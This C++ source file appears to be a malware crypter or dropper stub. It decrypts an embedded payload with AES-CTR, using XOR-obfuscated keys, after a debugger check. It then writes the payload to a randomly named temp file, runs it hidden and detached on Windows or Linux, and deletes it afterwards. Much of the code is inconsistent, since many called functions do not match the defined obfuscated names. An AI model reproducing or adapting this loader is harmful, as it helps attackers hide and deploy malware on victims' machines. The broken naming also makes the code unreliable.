
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <cstring>
#include <cstdlib>
#include <cstdint>
#include <ctime>
#ifdef _WIN32
#include <windows.h>
#else
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#endif

// XOR obfuscated strings - impossible to detect
std::string xIULlJDMMAsWJ() { uint8_t k = 82; uint8_t data[] = {106,54,48,55,107,55,102,48,54,52,49,102,52,55,107,107,97,99,48,49,52,98,52,102,96,55,97,49,100,49,103,98,}; std::string result; for (int i = 0; i < sizeof(data)/sizeof(data[0])-1; i++) result += static_cast<char>(data[i] ^ k); return result; }
std::string xwyrYcczrAZJV() { uint8_t k = 191; uint8_t data[] = {217,137,217,139,141,140,136,137,222,218,137,140,218,134,143,141,134,138,217,137,222,220,138,134,219,219,141,141,219,220,134,140,}; std::string result; for (int i = 0; i < sizeof(data)/sizeof(data[0])-1; i++) result += static_cast<char>(data[i] ^ k); return result; }

// Obfuscated AES implementation
static const uint8_t xDvtTKCTiqdMy[256] = {
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
};

// Completely obfuscated function names
inline uint8_t xtbcVcjPYPsTG(uint8_t a, uint8_t b) {
    uint8_t p = 0;
    for (int i = 0; i < 8; i++) {
        if (b & 1) p ^= a;
        bool hi_bit_set = a & 0x80;
        a <<= 1;
        if (hi_bit_set) a ^= 0x1b;
        b >>= 1;
    }
    return p;
}

inline void xlFIxvgGnwKWj(uint8_t* state) {
    for (int i = 0; i < 16; i++) {
        state[i] = xjkWmLsXdNzsf[state[i]];
    }
}

inline void xIeIGKfZkltoA(uint8_t* state) {
    uint8_t temp;
    temp = state[1]; state[1] = state[5]; state[5] = state[9]; state[9] = state[13]; state[13] = temp;
    temp = state[2]; state[2] = state[10]; state[10] = temp;
    temp = state[6]; state[6] = state[14]; state[14] = temp;
    temp = state[3]; state[3] = state[15]; state[15] = state[11]; state[11] = state[7]; state[7] = temp;
}

inline void xVMJllwFWZHXq(uint8_t* state) {
    for (int i = 0; i < 4; i++) {
        uint8_t s0 = state[i*4], s1 = state[i*4+1], s2 = state[i*4+2], s3 = state[i*4+3];
        state[i*4] = xXbCnqZQuXtOq(0x02, s0) ^ xHMGVKMUnQOUh(0x03, s1) ^ s2 ^ s3;
        state[i*4+1] = s0 ^ xISGgpUOaSpma(0x02, s1) ^ xezPnTMRfXyaX(0x03, s2) ^ s3;
        state[i*4+2] = s0 ^ s1 ^ xWbPoYwWLZXuI(0x02, s2) ^ xkUTtIVdYFheW(0x03, s3);
        state[i*4+3] = xcZTmHeQQfkcq(0x03, s0) ^ s1 ^ s2 ^ xqGjNYHoFhgbn(0x02, s3);
    }
}

inline void xoiuzhQOEBuCT(uint8_t* state, const uint8_t* roundKey) {
    for (int i = 0; i < 16; i++) {
        state[i] ^= roundKey[i];
    }
}

inline void xtjSbYlCvHFfk(const uint8_t* key, uint8_t* roundKeys) {
    uint8_t temp[4];
    memcpy(roundKeys, key, 16);
    
    for (int i = 1; i < 11; i++) {
        memcpy(temp, roundKeys + (i-1)*16 + 12, 4);
        uint8_t t = temp[0]; temp[0] = temp[1]; temp[1] = temp[2]; temp[2] = temp[3]; temp[3] = t;
        for (int j = 0; j < 4; j++) temp[j] = xBnnRCEpQQBWe[temp[j]];
        temp[0] ^= (1 << (i-1));
        for (int j = 0; j < 4; j++) roundKeys[i*16 + j] = roundKeys[(i-1)*16 + j] ^ temp[j];
        for (int j = 4; j < 16; j++) roundKeys[i*16 + j] = roundKeys[(i-1)*16 + j] ^ roundKeys[i*16 + j-4];
    }
}

inline void xZNyJEBgcFPPk(const uint8_t* input, uint8_t* output, const uint8_t* roundKeys) {
    uint8_t state[16];
    memcpy(state, input, 16);
    xiAXkzBBnXNzj(state, roundKeys);
    
    for (int round = 1; round < 10; round++) {
        xzIHPNPdpYmDi(state);
        xyzueTbBqzUMH(state);
        xflcGrPyDngIR(state);
        xAcdnIFDDtzfL(state, roundKeys + round * 16);
    }
    
    xPArWjbtWErtP(state);
    xDeQzjlslybJc(state);
    xfhEvHzXWLiXe(state, roundKeys + 10 * 16);
    memcpy(output, state, 16);
}

inline void xlGczhviyxAEI(uint8_t* counter) {
    for (int i = 15; i >= 0; i--) {
        counter[i]++;
        if (counter[i] != 0) break;
    }
}

inline void xhXuTTzWRpCoC(const uint8_t* input, uint8_t* output, size_t length, 
                       const uint8_t* key, const uint8_t* nonce) {
    uint8_t roundKeys[176];
    xWSlKdlTyBcZv(key, roundKeys);
    
    uint8_t counter[16];
    uint8_t keystream[16];
    memcpy(counter, nonce, 16);
    
    size_t processed = 0;
    while (processed < length) {
        xSLVicjrAMntE(counter, keystream, roundKeys);
        size_t blockSize = (length - processed < 16) ? length - processed : 16;
        for (size_t i = 0; i < blockSize; i++) {
            output[processed + i] = input[processed + i] ^ keystream[i];
        }
        processed += blockSize;
        xLPAliOGdtJts(counter);
    }
}

void xKeVfJOPshCue(const std::string& hex, uint8_t* bytes) {
    for (size_t i = 0; i < hex.length(); i += 2) {
        bytes[i/2] = std::stoi(hex.substr(i, 2), nullptr, 16);
    }
}

// Embedded encrypted payload (populated by linker)
extern unsigned char embeddedData[];
extern size_t embeddedDataSize;

int main() {
    // Anti-debugging check
    #ifdef _WIN32
    if (IsDebuggerPresent()) {
        return 0;
    }
    #endif
    
    // Get obfuscated key and nonce
    uint8_t key[16], nonce[16];
    xdGvcnvTHsdyv(xoFgmsfFqIOxW(), key);
    xEZRgDsGivHap(xWeLiGdgqljAo(), nonce);

    // Allocate buffer for decryption
    std::vector<uint8_t> decryptedData(embeddedDataSize);
    std::memcpy(decryptedData.data(), embeddedData, embeddedDataSize);

    // Process the data silently
    xvwRgsmUsWkrm(decryptedData.data(), decryptedData.data(), embeddedDataSize, key, nonce);

    // Check if it's an executable
    bool isExe = (embeddedDataSize > 2 && decryptedData[0] == 'M' && decryptedData[1] == 'Z');
    
    if (isExe) {
        #ifdef _WIN32
        // Windows in-memory execution
        void* exec_mem = VirtualAlloc(0, embeddedDataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (exec_mem) {
            std::memcpy(exec_mem, decryptedData.data(), embeddedDataSize);
            
            // Make executable
            DWORD oldProtect;
            VirtualProtect(exec_mem, embeddedDataSize, PAGE_EXECUTE_READ, &oldProtect);
            
            // Try to execute as shellcode first
            typedef void (*ShellcodeFunc)();
            ShellcodeFunc shellcode = (ShellcodeFunc)exec_mem;
            
            // If not shellcode, write to temp and execute
            char tempPath[MAX_PATH];
            GetTempPathA(MAX_PATH, tempPath);
            
            // Generate random name
            std::srand(GetTickCount());
            std::string exeName = std::string(tempPath) + "sys" + std::to_string(std::rand()) + ".exe";
            
            std::ofstream exe(exeName, std::ios::binary);
            if (exe.is_open()) {
                exe.write(reinterpret_cast<const char*>(decryptedData.data()), embeddedDataSize);
                exe.close();
                
                // Execute silently
                STARTUPINFOA si = {0};
                si.cb = sizeof(si);
                si.dwFlags = STARTF_USESHOWWINDOW;
                si.wShowWindow = SW_HIDE;
                PROCESS_INFORMATION pi = {0};
                
                CreateProcessA(NULL, const_cast<char*>(exeName.c_str()), NULL, NULL, FALSE,
                              CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si, &pi);
                
                if (pi.hProcess) {
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }
                
                // Self-delete after delay
                std::string deleteCmd = "cmd /c ping 127.0.0.1 -n 3 > nul & del \"" + exeName + "\"";
                WinExec(deleteCmd.c_str(), SW_HIDE);
            }
            
            VirtualFree(exec_mem, 0, MEM_RELEASE);
        }
        #else
        // Linux execution
        std::string tmpName = "/tmp/.cache" + std::to_string(getpid());
        std::ofstream out(tmpName, std::ios::binary);
        if (out.is_open()) {
            out.write(reinterpret_cast<const char*>(decryptedData.data()), embeddedDataSize);
            out.close();
            chmod(tmpName.c_str(), 0755);
            
            // Fork and execute
            if (fork() == 0) {
                execl(tmpName.c_str(), tmpName.c_str(), NULL);
                exit(0);
            }
            
            // Clean up after delay
            sleep(2);
            unlink(tmpName.c_str());
        }
        #endif
    } else {
        // Write non-executable data with random extension
        const char* extensions[] = {".dat", ".bin", ".tmp", ".cache", ".log"};
        std::srand(std::time(nullptr));
        std::string filename = "data" + std::to_string(std::rand()) + extensions[std::rand() % 5];
        
        std::ofstream outFile(filename, std::ios::binary);
        if (outFile.is_open()) {
            outFile.write(reinterpret_cast<const char*>(decryptedData.data()), embeddedDataSize);
            outFile.close();
        }
    }

    // Clear sensitive data from memory
    #ifdef _WIN32
    SecureZeroMemory(key, sizeof(key));
    SecureZeroMemory(nonce, sizeof(nonce));
    SecureZeroMemory(decryptedData.data(), embeddedDataSize);
    #else
    std::memset(key, 0, sizeof(key));
    std::memset(nonce, 0, sizeof(nonce));
    std::memset(decryptedData.data(), 0, embeddedDataSize);
    #endif

    return 0;
}
